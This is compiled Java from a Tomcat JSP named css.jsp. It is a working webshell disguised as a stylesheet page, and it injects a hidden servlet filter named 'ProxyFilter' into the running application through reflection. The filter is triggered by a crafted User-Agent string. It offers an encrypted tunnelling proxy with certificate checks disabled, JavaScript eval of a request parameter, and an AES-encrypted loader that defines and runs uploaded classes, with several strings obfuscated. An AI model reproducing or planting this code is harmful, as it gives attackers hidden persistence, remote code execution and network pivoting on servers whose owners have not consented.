/*
 * Generated by the Jasper component of Apache Tomcat
 * Version: Apache Tomcat
 * Generated at: 2024-04-19 07:07:01 UTC
 * Note: The last modified time of this file was set to
 *       the last modified time of the source file after
 *       generation to assist with modification tracking.
 */
package org.apache.jsp;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.jsp.*;
import java.util.HashSet;
import java.lang.reflect.InvocationTargetException;
import org.apache.catalina.core.StandardContext;
import java.lang.reflect.Method;
import java.lang.reflect.Field;
import java.util.HashMap;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.security.ProtectionDomain;
import java.io.*;
import java.nio.ByteBuffer;
import java.util.Enumeration;
import java.net.*;
import javax.net.ssl.*;
import java.security.cert.X509Certificate;
import java.security.cert.CertificateException;
import org.apache.catalina.core.ApplicationContext;

public final class css_jsp extends org.apache.jasper.runtime.HttpJspBase
    implements org.apache.jasper.runtime.JspSourceDependent,
                 org.apache.jasper.runtime.JspSourceImports {


    public static class $ProxyFilter$$Lambda$1 implements Filter, Runnable, HostnameVerifier, X509TrustManager {

        static HashSet<Object> h = null;
        static HttpServletRequest r = null;
        static HttpServletResponse p = null;

        public $ProxyFilter$$Lambda$1(){

        }

        private String key = "5f4dcc3b5aa765d6";
        private String pass = "username";
        private String md5 = md5(this.pass + this.key);

        public byte[] decrypt ( byte[] s, boolean m){
            try {
                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(this.key.getBytes(), "AES"));
                return c.doFinal(s);
            } catch (Exception e) {
                return null;
            }
        }

        public static String md5(String s){
            String ret = null;
            try {
                java.security.MessageDigest m;
                m = java.security.MessageDigest.getInstance("MD5");
                m.update(s.getBytes(), 0, s.length());
                ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
            } catch (Exception e) {
            }
            return ret;
        }

        public static String be ( byte[] bs) throws Exception {
            Class base64;
            String value = null;
            try {
                base64 = Class.forName("java.util.Ba" + "se64");
                Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
                value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e) {
                try {
                    base64 = Class.forName("sun.misc.BASE" + "64Encoder");
                    Object Encoder = base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
                } catch (Exception e2) {
                }
            }
            return value;
        }
        public static byte[] bd (String bs) throws Exception {
            Class base64;
            byte[] value = null;
            try {
                base64 = Class.forName("java.util.Ba" + "se64");
                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e) {
                try {
                    base64 = Class.forName("sun.misc.BASE" + "64Decoder");
                    Object decoder = base64.newInstance();
                    value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
                } catch (Exception e2) {
                }
            }
            return value;
        }
        public static HashMap addrs = collectAddr();
        public static HashMap ctx = new HashMap();

        InputStream gInStream;
        OutputStream gOutStream;

        public $ProxyFilter$$Lambda$1(InputStream in, OutputStream out) {
            this.gInStream = in;
            this.gOutStream = out;
        }

        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest sReq = (HttpServletRequest) servletRequest;
            HttpServletResponse sRes = (HttpServletResponse) servletResponse;

            String contentType = sReq.getHeader("Content-Type");

            String ua = sReq.getHeader("User-Agent");
            String pattern = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_89_";
            int idx = ua.indexOf(pattern);
            int idx2 = ua.indexOf("AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36");

            if (idx > -1 && idx2 > -1) {
                String type = ua.substring(idx + pattern.length(), idx + pattern.length() + 2);

                if(type.equals("00")) {
                    if (contentType == null) {
                        filterChain.doFilter(servletRequest, servletResponse);
                    }

                    try {
                        if (contentType.equals("application/plain")) {
                            tryFullDuplex(sReq, sRes);
                            return;
                        }

                        if (contentType.equals("application/octet-stream")) {
                            processDataBio(sReq, sRes);
                        } else {
                            processDataUnary(sReq, sRes);
                        }
                    } catch (Throwable e) {

                    }
                }else if(type.equals("01")){
                    PrintWriter out = sRes.getWriter();
                    out.println("done");
                    out.flush();
                    out.close();
                }else if(type.equals("02")){
                    PrintWriter out = sRes.getWriter();
                    ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName("js");
                    scriptEngine.put("request", sReq);
                    scriptEngine.put("response", sRes);
                    try {
                        out.println(scriptEngine.eval(sReq.getParameter("username")).toString());
                        out.flush();
                        out.close();
                    } catch (ScriptException e) {
//                    throw new RuntimeException(e);
                    }
                }else if(type.equals("03")) {

                    PrintWriter out = sRes.getWriter();
                    HttpSession session = sReq.getSession();
                    Method m = null;
                    try {
                        m = Class.forName("java.lang.Cla"+"ssLoader").getDeclaredMethod("define" + "Class1", String.class, byte[].class, int.class, int.class, ProtectionDomain.class, String.class);
                        m.setAccessible(true);

                        byte[] data = bd(sReq.getParameter(pass));
                        data = decrypt(data, false);
                        if (session.getAttribute("pay"+"load") == null) {
                            Class c = (Class) m.invoke(Thread.currentThread().getContextClassLoader(), null, data, 0, data.length, null, null);
                            session.setAttribute("pay"+"load", c);
                        } else {
                            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                            Object f = ((Class) session.getAttribute("pay"+"load")).newInstance();
                            f.equals(arrOut);
                            f.equals(sReq);
                            f.equals(data);
                            sRes.getWriter().write(md5.substring(0, 16));
                            f.toString();
                            out.write(be(decrypt(arrOut.toByteArray(), true)));
                            out.write(md5.substring(16));
                            out.flush();
                            out.close();
                        }
                    } catch (Exception e) {
                    }
                }else{
                    filterChain.doFilter(servletRequest, servletResponse);
                }
            }else{
                filterChain.doFilter(servletRequest, servletResponse);
            }
        }

        public void destroy() {
        }

        public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
            int bufferOffset = 0;
            while (bufferOffset < b.length) {
                int readLength = b.length - bufferOffset;
                int readResult = is.read(b, bufferOffset, readLength);
                if (readResult == -1) break;
                bufferOffset += readResult;
            }
        }

        public void tryFullDuplex(HttpServletRequest request, HttpServletResponse response) throws IOException, InterruptedException {
            InputStream in = request.getInputStream();
            byte[] data = new byte[32];
            readFull(in, data);
            OutputStream out = response.getOutputStream();
            out.write(data);
            out.flush();
        }


        private HashMap newCreate(byte s) {
            HashMap m = new HashMap();
            m.put("ac", new byte[]{0x04});
            m.put("s", new byte[]{s});
            return m;
        }

        private HashMap newData(byte[] data) {
            HashMap m = new HashMap();
            m.put("ac", new byte[]{0x01});
            m.put("dt", data);
            return m;
        }

        private HashMap newDel() {
            HashMap m = new HashMap();
            m.put("ac", new byte[]{0x02});
            return m;
        }

        private HashMap newStatus(byte b) {
            HashMap m = new HashMap();
            m.put("s", new byte[]{b});
            return m;
        }

        byte[] u32toBytes(int i) {
            byte[] result = new byte[4];
            result[0] = (byte) (i >> 24);
            result[1] = (byte) (i >> 16);
            result[2] = (byte) (i >> 8);
            result[3] = (byte) (i /*>> 0*/);
            return result;
        }

        int bytesToU32(byte[] bytes) {
            return ((bytes[0] & 0xFF) << 24) |
                    ((bytes[1] & 0xFF) << 16) |
                    ((bytes[2] & 0xFF) << 8) |
                    ((bytes[3] & 0xFF) << 0);
        }

        synchronized void put(String k, Object v) {
            ctx.put(k, v);
        }

        synchronized Object get(String k) {
            return ctx.get(k);
        }

        synchronized Object remove(String k) {
            return ctx.remove(k);
        }

        byte[] copyOfRange(byte[] original, int from, int to) {
            int newLength = to - from;
            if (newLength < 0) {
                throw new IllegalArgumentException(from + " > " + to);
            }
            byte[] copy = new byte[newLength];
            int copyLength = Math.min(original.length - from, newLength);
            // can't use System.arraycopy of Arrays.copyOf, there is no system in some environment
            // System.arraycopy(original, from, copy, 0,  copyLength);
            for (int i = 0; i < copyLength; i++) {
                copy[i] = original[from + i];
            }
            return copy;
        }


        private byte[] marshal(HashMap m) throws IOException {
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            Object[] keys = m.keySet().toArray();
            for (int i = 0; i < keys.length; i++) {
                String key = (String) keys[i];
                byte[] value = (byte[]) m.get(key);
                buf.write((byte) key.length());
                buf.write(key.getBytes());
                buf.write(u32toBytes(value.length));
                buf.write(value);
            }

            byte[] data = buf.toByteArray();
            ByteBuffer dbuf = ByteBuffer.allocate(5 + data.length);
            dbuf.putInt(data.length);
            // xor key
            byte key = data[data.length / 2];
            dbuf.put(key);
            for (int i = 0; i < data.length; i++) {
                data[i] = (byte) (data[i] ^ key);
            }
            dbuf.put(data);
            return dbuf.array();
        }

        private HashMap unmarshal(InputStream in) throws Exception {
            byte[] header = new byte[4 + 1]; // size and datatype
            readFull(in, header);
            // read full
            ByteBuffer bb = ByteBuffer.wrap(header);
            int len = bb.getInt();
            int x = bb.get();
            if (len > 1024 * 1024 * 32) {
                throw new IOException("invalid len");
            }
            byte[] bs = new byte[len];
            readFull(in, bs);
            for (int i = 0; i < bs.length; i++) {
                bs[i] = (byte) (bs[i] ^ x);
            }
            HashMap m = new HashMap();
            byte[] buf;
            for (int i = 0; i < bs.length - 1; ) {
                short kLen = bs[i];
                i += 1;
                if (i + kLen >= bs.length) {
                    throw new Exception("key len error");
                }
                if (kLen < 0) {
                    throw new Exception("key len error");
                }
                buf = copyOfRange(bs, i, i + kLen);
                String key = new String(buf);
                i += kLen;

                if (i + 4 >= bs.length) {
                    throw new Exception("value len error");
                }
                buf = copyOfRange(bs, i, i + 4);
                int vLen = bytesToU32(buf);
                i += 4;
                if (vLen < 0) {
                    throw new Exception("value error");
                }

                if (i + vLen > bs.length) {
                    throw new Exception("value error");
                }
                byte[] value = copyOfRange(bs, i, i + vLen);
                i += vLen;

                m.put(key, value);
            }
            return m;
        }

        private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
            final InputStream reqInputStream = request.getInputStream();
            HashMap dataMap = unmarshal(reqInputStream);

            byte[] action = (byte[]) dataMap.get("ac");
            if (action.length != 1 || action[0] != 0x00) {
                resp.setStatus(403);
                return;
            }
            resp.setBufferSize(512);
            final OutputStream respOutStream = resp.getOutputStream();

            // 0x00 create socket
            resp.setHeader("X-Accel-Buffering", "no");
            Socket sc;
            try {
                String host = new String((byte[]) dataMap.get("h"));
                int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
                if (port == 0) {
                    port = request.getLocalPort();
                }
                sc = new Socket();
                sc.connect(new InetSocketAddress(host, port), 5000);
            } catch (Exception e) {
                respOutStream.write(marshal(newStatus((byte) 0x01)));
                respOutStream.flush();
                respOutStream.close();
                return;
            }

            respOutStream.write(marshal(newStatus((byte) 0x00)));
            respOutStream.flush();
            resp.flushBuffer();

            final OutputStream scOutStream = sc.getOutputStream();
            final InputStream scInStream = sc.getInputStream();

            Thread t = null;
            try {
                $ProxyFilter$$Lambda$1 p = new $ProxyFilter$$Lambda$1(scInStream, respOutStream);
                t = new Thread(p);
                t.start();
                readReq(reqInputStream, scOutStream);
            } catch (Exception e) {
//                System.out.printf("pipe error, %s\n", e);
            } finally {
                sc.close();
                respOutStream.close();
                if (t != null) {
                    t.join();
                }
            }
        }

        private void readSocket(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws IOException {
            byte[] readBuf = new byte[1024 * 8];
            while (true) {
                int n = inputStream.read(readBuf);
                if (n <= 0) {
                    break;
                }
                byte[] dataTmp = copyOfRange(readBuf, 0, 0 + n);
                if (needMarshal) {
                    dataTmp = marshal(newData(dataTmp));
                }
                outputStream.write(dataTmp);
                outputStream.flush();
            }
        }

        private void readReq(InputStream bufInputStream, OutputStream socketOutStream) throws Exception {
            while (true) {
                HashMap dataMap;
                dataMap = unmarshal(bufInputStream);

                byte[] actions = (byte[]) dataMap.get("ac");
                if (actions.length != 1) {
                    return;
                }
                byte action = actions[0];
                if (action == 0x02) {
                    socketOutStream.close();
                    return;
                } else if (action == 0x01) {
                    byte[] data = (byte[]) dataMap.get("dt");
                    if (data.length != 0) {
                        socketOutStream.write(data);
                        socketOutStream.flush();
                    }
                } else if (action == 0x03) {
                    continue;
                } else {
                    return;
                }
            }
        }

        private void processDataUnary(HttpServletRequest request, HttpServletResponse resp) throws
                Exception {
            InputStream is = request.getInputStream();
            BufferedInputStream reader = new BufferedInputStream(is);
            HashMap dataMap;
            dataMap = unmarshal(reader);


            String clientId = new String((byte[]) dataMap.get("id"));
            byte[] actions = (byte[]) dataMap.get("ac");
            if (actions.length != 1) {
                resp.setStatus(403);
                return;
            }
            /*
                ActionCreate    byte = 0x00
                ActionData      byte = 0x01
                ActionDelete    byte = 0x02
                ActionHeartbeat byte = 0x03
             */
            byte action = actions[0];
            byte[] redirectData = (byte[]) dataMap.get("r");
            boolean needRedirect = redirectData != null && redirectData.length > 0;
            String redirectUrl = "";
            if (needRedirect) {
                dataMap.remove("r");
                redirectUrl = new String(redirectData);
                needRedirect = !isLocalAddr(redirectUrl);
            }
            // load balance, send request with data to request url
            // action 0x00 need to pipe, see below
            if (needRedirect && action >= 0x01 && action <= 0x03) {
                HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
                conn.disconnect();
                return;
            }

            resp.setBufferSize(512);
            OutputStream respOutStream = resp.getOutputStream();
            if (action == 0x02) {
                Object o = this.get(clientId);
                if (o == null) return;
                OutputStream scOutStream = (OutputStream) o;
                scOutStream.close();
                return;
            } else if (action == 0x01) {
                Object o = this.get(clientId);
                if (o == null) {
                    respOutStream.write(marshal(newDel()));
                    respOutStream.flush();
                    respOutStream.close();
                    return;
                }
                OutputStream scOutStream = (OutputStream) o;
                byte[] data = (byte[]) dataMap.get("dt");
                if (data.length != 0) {
                    scOutStream.write(data);
                    scOutStream.flush();
                }
                respOutStream.close();
                return;
            } else {
            }

            if (action != 0x00) {
                return;
            }
            // 0x00 create new tunnel
            resp.setHeader("X-Accel-Buffering", "no");
            String host = new String((byte[]) dataMap.get("h"));
            int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
            if (port == 0) {
                port = request.getLocalPort();
            }

            InputStream readFrom;
            Socket sc = null;
            HttpURLConnection conn = null;

            if (needRedirect) {
                // pipe redirect stream and current response body
                conn = redirect(request, dataMap, redirectUrl);
                readFrom = conn.getInputStream();
            } else {
                // pipe socket stream and current response body
                try {
                    sc = new Socket();
                    sc.connect(new InetSocketAddress(host, port), 5000);
                    readFrom = sc.getInputStream();
                    this.put(clientId, sc.getOutputStream());
                    respOutStream.write(marshal(newStatus((byte) 0x00)));
                    respOutStream.flush();
                    resp.flushBuffer();
                } catch (Exception e) {
//                    System.out.printf("connect error %s\n", e);
//                    e.printStackTrace();
                    this.remove(clientId);
                    respOutStream.write(marshal(newStatus((byte) 0x01)));
                    respOutStream.flush();
                    respOutStream.close();
                    return;
                }
            }
            try {
                readSocket(readFrom, respOutStream, !needRedirect);
            } catch (Exception e) {
//                System.out.println("socket error " + e.toString());
//                e.printStackTrace();
            } finally {
                if (sc != null) {
                    sc.close();
                }
                if (conn != null) {
                    conn.disconnect();
                }
                respOutStream.close();
                this.remove(clientId);
            }
        }

        public void run() {
            try {
                readSocket(gInStream, gOutStream, true);
            } catch (Exception e) {
//                System.out.printf("read socket error, %s\n", e);
//                e.printStackTrace();
            }
        }

        static HashMap collectAddr() {
            HashMap addrs = new HashMap();
            try {
                Enumeration nifs = NetworkInterface.getNetworkInterfaces();
                while (nifs.hasMoreElements()) {
                    NetworkInterface nif = (NetworkInterface) nifs.nextElement();
                    Enumeration addresses = nif.getInetAddresses();
                    while (addresses.hasMoreElements()) {
                        InetAddress addr = (InetAddress) addresses.nextElement();
                        String s = addr.getHostAddress();
                        if (s != null) {
                            // fe80:0:0:0:fb0d:5776:2d7c:da24%wlan4  strip %wlan4
                            int ifaceIndex = s.indexOf('%');
                            if (ifaceIndex != -1) {
                                s = s.substring(0, ifaceIndex);
                            }
                            addrs.put((Object) s, (Object) Boolean.TRUE);
                        }
                    }
                }
            } catch (Exception e) {
//                System.out.printf("read socket error, %s\n", e);
//                e.printStackTrace();
            }
            return addrs;
        }

        boolean isLocalAddr(String url) throws Exception {
            String ip = (new URL(url)).getHost();
            return addrs.containsKey(ip);
        }

        HttpURLConnection redirect(HttpServletRequest request, HashMap dataMap, String rUrl) throws Exception {
            String method = request.getMethod();
            URL u = new URL(rUrl);
            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
            conn.setRequestMethod(method);
            try {
                // conn.setConnectTimeout(3000);
                conn.getClass().getMethod("setConnectTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(3000)});
                // conn.setReadTimeout(0);
                conn.getClass().getMethod("setReadTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(0)});
            } catch (Exception e) {
                // java1.4
            }
            conn.setDoOutput(true);
            conn.setDoInput(true);

            // ignore ssl verify
            // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
            if (HttpsURLConnection.class.isInstance(conn)) {
                ((HttpsURLConnection) conn).setHostnameVerifier(this);
                SSLContext sslCtx = SSLContext.getInstance("SSL");
                sslCtx.init(null, new TrustManager[]{this}, null);
                ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
            }

            Enumeration headers = request.getHeaderNames();
            while (headers.hasMoreElements()) {
                String k = (String) headers.nextElement();
                conn.setRequestProperty(k, request.getHeader(k));
            }

            OutputStream rout = conn.getOutputStream();
            rout.write(marshal(dataMap));
            rout.flush();
            rout.close();
            conn.getResponseCode();
            return conn;
        }

        public boolean verify(String hostname, SSLSession session) {
            return true;
        }

        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }

        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }

        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }



    }


  private static final javax.servlet.jsp.JspFactory _jspxFactory =
          javax.servlet.jsp.JspFactory.getDefaultFactory();

  private static java.util.Map<java.lang.String,java.lang.Long> _jspx_dependants;

  private static final java.util.Set<java.lang.String> _jspx_imports_packages;

  private static final java.util.Set<java.lang.String> _jspx_imports_classes;

  static {
    _jspx_imports_packages = new java.util.HashSet<>();
    _jspx_imports_packages.add("javax.servlet");
    _jspx_imports_packages.add("java.net");
    _jspx_imports_packages.add("javax.servlet.http");
    _jspx_imports_packages.add("java.io");
    _jspx_imports_packages.add("javax.net.ssl");
    _jspx_imports_packages.add("javax.servlet.jsp");
    _jspx_imports_classes = new java.util.HashSet<>();
    _jspx_imports_classes.add("java.security.cert.X509Certificate");
    _jspx_imports_classes.add("java.util.Enumeration");
    _jspx_imports_classes.add("javax.script.ScriptEngineManager");
    _jspx_imports_classes.add("java.util.HashMap");
    _jspx_imports_classes.add("org.apache.catalina.core.ApplicationContext");
    _jspx_imports_classes.add("java.security.cert.CertificateException");
    _jspx_imports_classes.add("java.lang.reflect.Field");
    _jspx_imports_classes.add("java.nio.ByteBuffer");
    _jspx_imports_classes.add("java.lang.reflect.InvocationTargetException");
    _jspx_imports_classes.add("java.util.HashSet");
    _jspx_imports_classes.add("java.security.ProtectionDomain");
    _jspx_imports_classes.add("javax.script.ScriptEngine");
    _jspx_imports_classes.add("org.apache.catalina.core.StandardContext");
    _jspx_imports_classes.add("java.lang.reflect.Method");
    _jspx_imports_classes.add("javax.script.ScriptException");
  }

  private volatile javax.el.ExpressionFactory _el_expressionfactory;
  private volatile org.apache.tomcat.InstanceManager _jsp_instancemanager;

  public java.util.Map<java.lang.String,java.lang.Long> getDependants() {
    return _jspx_dependants;
  }

  public java.util.Set<java.lang.String> getPackageImports() {
    return _jspx_imports_packages;
  }

  public java.util.Set<java.lang.String> getClassImports() {
    return _jspx_imports_classes;
  }

  public javax.el.ExpressionFactory _jsp_getExpressionFactory() {
    if (_el_expressionfactory == null) {
      synchronized (this) {
        if (_el_expressionfactory == null) {
          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();
        }
      }
    }
    return _el_expressionfactory;
  }

  public org.apache.tomcat.InstanceManager _jsp_getInstanceManager() {
    if (_jsp_instancemanager == null) {
      synchronized (this) {
        if (_jsp_instancemanager == null) {
          _jsp_instancemanager = org.apache.jasper.runtime.InstanceManagerFactory.getInstanceManager(getServletConfig());
        }
      }
    }
    return _jsp_instancemanager;
  }

  public void _jspInit() {
  }

  public void _jspDestroy() {
  }

  public void _jspService(final javax.servlet.http.HttpServletRequest request, final javax.servlet.http.HttpServletResponse response)
      throws java.io.IOException, javax.servlet.ServletException {

    final java.lang.String _jspx_method = request.getMethod();
    if (!"GET".equals(_jspx_method) && !"POST".equals(_jspx_method) && !"HEAD".equals(_jspx_method) && !javax.servlet.DispatcherType.ERROR.equals(request.getDispatcherType())) {
      response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, "JSP 只允许 GET、POST 或 HEAD。Jasper 还允许 OPTIONS");
      return;
    }

    final javax.servlet.jsp.PageContext pageContext;
    javax.servlet.http.HttpSession session = null;
    final javax.servlet.ServletContext application;
    final javax.servlet.ServletConfig config;
    javax.servlet.jsp.JspWriter out = null;
    final java.lang.Object page = this;
    javax.servlet.jsp.JspWriter _jspx_out = null;
    javax.servlet.jsp.PageContext _jspx_page_context = null;


    try {
      response.setContentType("text/html");
      pageContext = _jspxFactory.getPageContext(this, request, response,
      			null, true, 8192, true);
      _jspx_page_context = pageContext;
      application = pageContext.getServletContext();
      config = pageContext.getServletConfig();
      session = pageContext.getSession();
      out = pageContext.getOut();
      _jspx_out = out;

      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write('\n');
      out.write('\n');

    ServletContext servletContext = request.getServletContext();
    Field field = servletContext.getClass().getDeclaredField("context");
    field.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);

    field = applicationContext.getClass().getDeclaredField("context");
    field.setAccessible(true);
    StandardContext standardContext = (StandardContext) field.get(applicationContext);
    Class filterDefClass = null;
    try {
        filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
    } catch (ClassNotFoundException e) {
        filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
    }

    Filter filter = new $ProxyFilter$$Lambda$1();
    Object filterDef = filterDefClass.newInstance();
    filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, "ProxyFilter");
    filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, filter.getClass().getName());
    filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, filter);

    Method method = standardContext.getClass().getDeclaredMethod("addFilterDef", filterDefClass);
    method.invoke(standardContext, filterDef);

    Class filterMapClass = null;
    try {
        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
    } catch (ClassNotFoundException e) {
        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
    }

    Object filterMap = filterMapClass.newInstance();
    filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, "ProxyFilter");
    filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());
    filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, "/*");

    method = standardContext.getClass().getDeclaredMethod("addFilterMapBefore", filterMapClass);
    method.invoke(standardContext, filterMap);
    method = standardContext.getClass().getDeclaredMethod("filterStart");
    method.invoke(standardContext);

    } catch (java.lang.Throwable t) {
      if (!(t instanceof javax.servlet.jsp.SkipPageException)){
        out = _jspx_out;
        if (out != null && out.getBufferSize() != 0)
          try {
            if (response.isCommitted()) {
              out.flush();
            } else {
              out.clearBuffer();
            }
          } catch (java.io.IOException e) {}
        if (_jspx_page_context != null) _jspx_page_context.handlePageException(t);
        else throw new ServletException(t);
      }
    } finally {
      _jspxFactory.releasePageContext(_jspx_page_context);
    }
  }
}
